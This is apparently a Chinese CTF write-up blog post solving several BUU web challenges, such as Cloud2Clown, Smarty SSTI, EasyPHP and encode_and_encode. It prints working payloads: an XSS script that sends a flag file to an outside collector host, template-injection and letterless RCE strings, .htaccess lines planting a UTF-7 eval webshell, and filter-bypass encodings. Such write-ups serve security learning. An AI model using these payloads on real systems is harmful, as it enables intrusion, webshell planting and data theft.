<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="BUU WEB åˆ·é¢˜ç¬”è®°6"><meta name="keywords" content=""><meta name="author" content="m0nk3y"><meta name="copyright" content="m0nk3y"><title>BUU WEB åˆ·é¢˜ç¬”è®°6 | M0nk3y's Blog @ D0g3</title><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201228205809.JPG"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js"></script><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.1.1'
} </script><meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="M0nk3y's Blog @ D0g3" type="application/atom+xml">
</head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#BSidesCF-2020-Hurdles"><span class="toc-number">1.</span> <span class="toc-text">[BSidesCF 2020]Hurdles</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BSidesCF-2019-Cloud2Clown"><span class="toc-number">2.</span> <span class="toc-text">[BSidesCF 2019]Cloud2Clown</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web11"><span class="toc-number">3.</span> <span class="toc-text">[CISCN2019 åä¸œå—èµ›åŒº]Web11</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME"><span class="toc-number">4.</span> <span class="toc-text">[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME####</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XNUCA2019Qualifier-EasyPHP"><span class="toc-number">5.</span> <span class="toc-text">[XNUCA2019Qualifier]EasyPHP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HarekazeCTF2019-encode-and-encode"><span class="toc-number">6.</span> <span class="toc-text">[HarekazeCTF2019]encode_and_encode</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HarekazeCTF2019-Easy-Notes"><span class="toc-number">7.</span> <span class="toc-text">[HarekazeCTF2019]Easy Notes</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WUSTCTF2020-easyweb"><span class="toc-number">8.</span> <span class="toc-text">[WUSTCTF2020]easyweb</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Zer0pts2020-Can-you-guess-it"><span class="toc-number">9.</span> <span class="toc-text">[Zer0pts2020]Can you guess it?</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#b01lers2020-Welcome-to-Earth"><span class="toc-number">10.</span> <span class="toc-text">[b01lers2020]Welcome to Earth</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#b01lers2020-Life-on-Mars"><span class="toc-number">11.</span> <span class="toc-text">[b01lers2020]Life on Mars</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GWCTF-2019-mypassword"><span class="toc-number">12.</span> <span class="toc-text">[GWCTF 2019]mypassword</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GWCTF-2019-%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97"><span class="toc-number">13.</span> <span class="toc-text">[GWCTF 2019]ä½ çš„åå­—</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GWCTF-2019-blog"><span class="toc-number">14.</span> <span class="toc-text">[GWCTF 2019]blog</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#b01lers2020-Scrambled"><span class="toc-number">15.</span> <span class="toc-text">[b01lers2020]Scrambled</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NCTF2019-True-XML-cookbook"><span class="toc-number">16.</span> <span class="toc-text">[NCTF2019]True XML cookbook</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DDCTF-2019-homebrew-event-loop"><span class="toc-number">17.</span> <span class="toc-text">[DDCTF 2019]homebrew event loop</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201228205809.JPG"></div><div class="author-info__name text-center">m0nk3y</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">58</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">52</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">9</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://www.google.com">Google</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200825211012.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">M0nk3y's Blog @ D0g3</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/about">About</a><a class="site-page" href="/link">Friends</a><a class="site-page" href="/mytalk">è¯´è¯´</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">BUU WEB åˆ·é¢˜ç¬”è®°6</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-04-01</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/Writeup/">Writeup</a><div class="post-meta-wordcount"><span>Word count: </span><span class="word-count">5.1k</span><span class="post-meta__separator">|</span><span>Reading time: 23 min</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="BSidesCF-2020-Hurdles"><a href="#BSidesCF-2020-Hurdles" class="headerlink" title="[BSidesCF 2020]Hurdles"></a>[BSidesCF 2020]Hurdles</h1><p>ä¸€é“ç¥ä»™é¢˜â€¦. æŠŠHTTP header é‡Œé¢èƒ½æçš„ä¸œè¥¿éƒ½æäº†ä¸€é,,, æˆ‘ç›´æ¥ç”¨çš„Postman æ¯”è¾ƒæ–¹ä¾¿, è™½ç„¶curl ä¹Ÿå¯ä»¥â€¦ ä½†æ˜¯æ—¢ç„¶æœ‰å·¥å…·ä¸ºä»€ä¹ˆä¸ç”¨å˜›(SBè­¦å‘Š!)</p>
<p><strong>è·Ÿç€é¢˜ç›®çš„å¼•å¯¼ä¸€æ­¥ä¸€æ­¥å»åš, å»æœç´¢, å–„äºåˆ©ç”¨Google</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200404011604.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200404011603.png"></p>
<p>flag åœ¨headsä¸­çš„ <strong>X-Ctf-Flag</strong></p>
<h1 id="BSidesCF-2019-Cloud2Clown"><a href="#BSidesCF-2019-Cloud2Clown" class="headerlink" title="[BSidesCF 2019]Cloud2Clown"></a>[BSidesCF 2019]Cloud2Clown</h1><p>é¢˜ç›®å­˜åœ¨robotx.txt </p>
<p>å½“è®¿é—®/hack æ—¶ è·³è½¬åˆ°äº†ä¸€ç¯‡æ–‡ç«  : <a target="_blank" rel="noopener" href="https://systemoverlord.com/">https://systemoverlord.com/</a> â€¦. æˆ‘å‚»äº† çœ‹äº†åšå®¢çš„ç¬¬ä¸€ç¯‡æ–‡ç« çœ‹äº†åŠå¤©, ç»“æœå‘ç°è¿™æ˜¯æœ€æ–°çš„ä¸€ç¯‡æ–‡ç«  0,0 æœ€ååœ¨åšå®¢é‡Œæ‰¾åˆ°äº†wp</p>
<p>è€ƒç‚¹</p>
<ul>
<li>Recon =&gt; robotx.txt</li>
<li>SSRF</li>
<li>XSS</li>
</ul>
<p>SSRF =&gt; <a target="_blank" rel="noopener" href="http://127.0.0.1:8801/status">http://127.0.0.1:8801/status</a> å¾—åˆ°flag1</p>
<p>flag2 è¦xss .. æ²¡æ‰“é€š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">fetch(&#39;&#x2F;flag.txt&#39;, &#123;mode: &#39;no-cors&#39;&#125;).then(function(r) &#123;</span><br><span class="line">  r.text().then(function(f) &#123;</span><br><span class="line">    var img &#x3D; document.createElement(&#39;img&#39;);</span><br><span class="line">    img.src &#x3D; &#39;http:&#x2F;&#x2F;xss.buuoj.cn&#x2F;do&#x2F;auth&#x2F;a13dce9419a9fb8f5001553f2a644b94&#x2F;&#39; + btoa(f);</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>







<h1 id="CISCN2019-åä¸œå—èµ›åŒº-Web11"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Web11" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Web11"></a>[CISCN2019 åä¸œå—èµ›åŒº]Web11</h1><ul>
<li>PHP Smarty æ¨¡æ¿å¼•æ“ ]</li>
<li>XFF </li>
<li>SSTI</li>
</ul>
<p>æ‰“å¼€é¢˜ç›® å¯ä»¥çœ‹åˆ°æ˜¯ Current IP : xxxx.x..x.x.xc.a.a.  æ˜¯è¢«æ‰“å°å‡ºæ¥çš„. å¹¶ä¸”é¢˜ç›®çš„API Usage ä¸­å­˜åœ¨XFF è€Œä¸” XFF æˆ‘ä»¬æ˜¯éšæ„å¯æ§çš„</p>
<p>ç”¨hacker ä¿®æ”¹ä¸€ä¸‹XFF, éšä¾¿æ”¹ä¸€ä¸‹, å°†æˆ‘ä»¬è¾“å…¥çš„è¿”å›äº† , è¯•ä¸€ä¸‹<code>&#123;&#123;config&#125;&#125;</code> å‘ç°æŠ¥é”™äº† , ä¸æ˜¯python çš„ssti , æ˜¯php çš„ </p>
<p><a target="_blank" rel="noopener" href="https://www.smarty.net/docs/zh_CN/language.variables.smarty.tpl#language.variables.smarty.version">https://www.smarty.net/docs/zh_CN/language.variables.smarty.tpl#language.variables.smarty.version</a></p>
<p>payload </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if readfile(&#39;&#x2F;flag&#39;)&#125;&#123;&#x2F;if&#125;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/oubasangdadada/article/details/104607777/">https://blog.csdn.net/oubasangdadada/article/details/104607777/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/eb8d0137a7d3">https://www.jianshu.com/p/eb8d0137a7d3</a></p>
<blockquote>
<p>åœ¨Smarty3çš„å®˜æ–¹æ‰‹å†Œé‡Œæœ‰ä»¥ä¸‹æè¿°:</p>
<p>Smartyå·²ç»åºŸå¼ƒ{php}æ ‡ç­¾ï¼Œå¼ºçƒˆå»ºè®®ä¸è¦ä½¿ç”¨ã€‚åœ¨Smarty 3.1ï¼Œ{php}ä»…åœ¨SmartyBCä¸­å¯ç”¨ã€‚</p>
</blockquote>
<blockquote>
<p>Smartyçš„{if}æ¡ä»¶åˆ¤æ–­å’ŒPHPçš„if éå¸¸ç›¸ä¼¼ï¼Œåªæ˜¯å¢åŠ äº†ä¸€äº›ç‰¹æ€§ã€‚æ¯ä¸ª{if}å¿…é¡»æœ‰ä¸€ä¸ªé…å¯¹çš„{/if}. ä¹Ÿå¯ä»¥ä½¿ç”¨{else} å’Œ {elseif}. å…¨éƒ¨çš„PHPæ¡ä»¶è¡¨è¾¾å¼å’Œå‡½æ•°éƒ½å¯ä»¥åœ¨ifå†…ä½¿ç”¨ï¼Œå¦‚*||<em>,<em>or</em>,</em>&amp;&amp;*,<em>and</em>,<em>is_array()</em>, ç­‰ç­‰</p>
</blockquote>
<h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME####"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME####</h1><ul>
<li>æ— å­—æ¯RCE. ç»•è¿‡disable_funciton getshell</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo</span><br></pre></td></tr></table></figure>



<h1 id="XNUCA2019Qualifier-EasyPHP"><a href="#XNUCA2019Qualifier-EasyPHP" class="headerlink" title="[XNUCA2019Qualifier]EasyPHP"></a>[XNUCA2019Qualifier]EasyPHP</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$files = scandir(<span class="string">&#x27;./&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">    <span class="keyword">if</span> (is_file($file)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($file !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            unlink($file); <span class="comment">// åˆ¤æ–­file , ä¸æ˜¯index å°±åˆ é™¤</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;fl3g.php&quot;</span>); <span class="comment">// (äº‹å®è¯æ˜,è¿™æ˜¯æœ‰å¤§ç”¨æ»´)</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$content = $_GET[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (stristr($content, <span class="string">&#x27;on&#x27;</span>) || stristr($content, <span class="string">&#x27;html&#x27;</span>) || stristr($content, <span class="string">&#x27;type&#x27;</span>) || stristr($content, <span class="string">&#x27;flag&#x27;</span>) || stristr($content, <span class="string">&#x27;upload&#x27;</span>) || stristr($content, <span class="string">&#x27;file&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$filename = $_GET[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/[^a-z\.]/&quot;</span>, $filename) == <span class="number">1</span>) &#123; <span class="comment">// æ–‡ä»¶åå¼€å¤´ä¸èƒ½å‡ºç°a-z ä»¥åŠ.</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$files = scandir(<span class="string">&#x27;./&#x27;</span>); <span class="comment">// ./ è¡¨ç¤ºå½“å‰ç›®å½•</span></span><br><span class="line"><span class="keyword">foreach</span> ($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">    <span class="keyword">if</span> (is_file($file)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($file !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            unlink($file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="comment">// åˆæ¥ä¸€æ¬¡æ–‡ä»¶åˆ¤æ–­, ä¸æ˜¯index å°±åˆ é™¤, é‚£ä¹ˆè¿™é‡Œç”¨æ¡ä»¶ç«äº‰æ¥ç»•è¿‡å³å¯</span></span><br><span class="line">file_put_contents($filename, $content . <span class="string">&quot;\nJust one chance&quot;</span>); <span class="comment">// æŠŠcontent å†™å…¥ filename ä¸­çš„æ–‡ä»¶</span></span><br><span class="line"> <span class="comment">// æ€è·¯å¾ˆæ¸…æ¥šäº†, å¤§æ¦‚å°±æ˜¯å†™ä¸ªwebshell ç„¶å getshell  flag åœ¨æ ¹ç›®å½•ä¸‹é¢è¿™ç§æ ·å­</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>â€¦. æˆ‘å¤ªå¤©çœŸäº†, å› ä¸ºæˆ‘è¿™ä¸ªæ€è·¯ä¸ç®¡æ€ä¹ˆæéƒ½ç»•ä¸è¿‡ çœ‹WP æ‰çŸ¥é“è¿™é“é¢˜ä¸ç®€å•!</p>
<p><a target="_blank" rel="noopener" href="https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/Ezphp">https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/Ezphp</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/mdsnins/ctf-writeups/blob/master/2019/Insomnihack%202019/l33t-hoster/l33t-hoster.md">https://github.com/mdsnins/ctf-writeups/blob/master/2019/Insomnihack%202019/l33t-hoster/l33t-hoster.md</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12296896.html">https://www.cnblogs.com/wangtanzhi/p/12296896.html</a></p>
<p>çŸ¥è¯†ç‚¹: </p>
<ul>
<li>åˆ©ç”¨æ–‡ä»¶åŒ…å«ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶ é…åˆerror_log åœ¨ include_path åœ¨tmpç›®å½•ä¸‹ç”Ÿæˆshell</li>
<li>UTF-7 ç¼–ç  ç»•è¿‡htmlå®ä½“ æ‰§è¡Œshell</li>
<li>.htaccess ä¸­çš„æ³¨é‡Šç¬¦ #  , æ¥æ³¨é‡Šæ‰æ¢è¡Œç¬¦</li>
</ul>
<p>æ ¸å¿ƒè¦ç‚¹: </p>
<ul>
<li><strong>error_logå¯ä»¥å°†phpè¿è¡ŒæŠ¥é”™çš„è®°å½•å†™åˆ°æŒ‡å®šæ–‡ä»¶ä¸­</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_value error_log &#x2F;tmp&#x2F;fl3g.php</span><br><span class="line">php_value error_reporting 32767</span><br><span class="line">php_value include_path &quot;+ADw?php eval($_GET[1])+ADs +AF8AXw-halt+AF8-compiler()+ADs&quot;</span><br><span class="line"># \</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_value include_path &quot;&#x2F;tmp&quot;</span><br><span class="line">php_value zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br><span class="line"># \</span><br></pre></td></tr></table></figure>

<p>éé¢„æœŸ1 :</p>
<p>æ—¢ç„¶<code>\</code> å¯ä»¥ç”¨æ¥è½¬ä¹‰æ¢è¡Œç¬¦, é‚£å°±è¿™é“é¢˜æ¥è¯´, ä¸ºä»€ä¹ˆä¸ç”¨æ¥è¿æ¥ä¸Šä¸‹æ–‡æ¥ç»•è¿‡è¿‡æ»¤?</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_fi\</span><br><span class="line">le &quot;.htaccess&quot;</span><br></pre></td></tr></table></figure>

<p>éé¢„æœŸ2 : </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value pcre.backtrack_limit 0</span><br><span class="line">php_value pcre.jit 0</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºæ­£åˆ™åˆ¤æ–­å†™çš„æ˜¯<code>if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1) &#123;</code>è€Œä¸æ˜¯<code>if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) !== 0) &#123;</code>ï¼Œå› æ­¤å­˜åœ¨äº†è¢«ç»•è¿‡çš„å¯èƒ½ã€‚ é€šè¿‡è®¾ç½®.htaccess</p>
<p>å¯¼è‡´preg_matchè¿”å›Falseï¼Œç»§è€Œç»•è¿‡äº†æ­£åˆ™åˆ¤æ–­ï¼Œfilenameå³å¯é€šè¿‡ä¼ªåè®®ç»•è¿‡å‰é¢stristrçš„åˆ¤æ–­å®ç°Getshellã€‚</p>
<p>è¿™é“é¢˜ä¸åšè¿‡å¤šç ”ç©¶, é‡åˆ°ç±»ä¼¼ç›´æ¥æ‹¿payload æ‰“ , æŠ½ç©ºçœ‹çœ‹phpæ‰‹å†Œ</p>
<h1 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h1><p>é¢˜ç›®æºç : (qurey.php çš„æºç )</p>
<ul>
<li>ç¼–ç ç»•è¿‡(æœ€è¿‘é‡åˆ°å¥½å¤šç¼–ç ç»•è¿‡çš„é¢˜)</li>
<li>php://filter ä¼ªåè®®</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params">$str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $banword = [</span><br><span class="line">        <span class="comment">// no path traversal</span></span><br><span class="line">        <span class="string">&#x27;\.\.&#x27;</span>,</span><br><span class="line">        <span class="comment">// no stream wrapper</span></span><br><span class="line">        <span class="string">&#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;</span>,</span><br><span class="line">        <span class="comment">// no data exfiltration</span></span><br><span class="line">        <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">    ];</span><br><span class="line">    $regexp = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $banword) . <span class="string">&#x27;/i&#x27;</span>; <span class="comment">// æ­£åˆ™</span></span><br><span class="line">    <span class="keyword">if</span> (preg_match($regexp, $str)) &#123; <span class="comment">// ç›¸å½“äºå­˜åœ¨ä¸€ä¸ªé»‘åå•</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$body = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>); <span class="comment">// æ¥æ”¶POST çš„æ•°æ®</span></span><br><span class="line">$json = json_decode($body, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_valid($body) &amp;&amp; <span class="keyword">isset</span>($json) &amp;&amp; <span class="keyword">isset</span>($json[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    $page = $json[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">    $content = file_get_contents($page); <span class="comment">// æ–‡ä»¶æ“ä½œå‡½æ•°, æ¥æ”¶postçš„æ•°æ®</span></span><br><span class="line">    <span class="keyword">if</span> (!$content || !is_valid($content)) &#123;</span><br><span class="line">        $content = <span class="string">&quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $content = <span class="string">&#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no data exfiltration!!!</span></span><br><span class="line">$content = preg_replace(<span class="string">&#x27;/HarekazeCTF\&#123;.+\&#125;/i&#x27;</span>, <span class="string">&#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;</span>, $content);</span><br><span class="line"><span class="keyword">echo</span> json_encode([<span class="string">&#x27;content&#x27;</span> =&gt; $content]);</span><br></pre></td></tr></table></figure>

<p>payload: </p>
<p>ç”¨php ä¼ªåè®®æ¥è¯»å–base64 çš„å½¢å¼çš„flag , ä»è€Œæ¥ç»•è¿‡é»‘åå•ä¸­çš„flag, å¯¹php é‡‡ç”¨json é€ƒè„±å­—ç¬¦å¤„ç†å³å¯</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;page&quot;:&quot;\u0070\u0068\u0070:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;\u0066\u006c\u0061\u0067&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸€å¥è¯å°æ€»ç»“: <strong>ç¼–ç ç»•è¿‡åœ¨Webä¸­æŒºå¸¸ç”¨çš„</strong></p>
<p><a target="_blank" rel="noopener" href="https://st98.github.io/diary/posts/2019-05-21-harekaze-ctf-2019.html#web-100-encode--encode">https://st98.github.io/diary/posts/2019-05-21-harekaze-ctf-2019.html#web-100-encode--encode</a></p>
<p>ä¸ºä»€ä¹ˆè¿™é‡Œç›´æ¥è¯»<code>/flag</code> å› ä¸ºåŸé¢˜æ˜¯æœ‰é™„ä»¶çš„, åœ¨Dokerfile ä¸­å¾—åˆ°çš„</p>
<p>åœ¨JSON <code>&#39;\uXXXX&#39;</code>èƒ½å¤Ÿé€ƒè„±å­—ç¬¦ï¼Œå¦‚ï¼Œä¾‹å¦‚ï¼Œ<code>&#39;A&#39;</code>å’Œ<code>&#39;\u0041&#39;</code>æ˜¯ç›¸ç­‰çš„ã€‚</p>
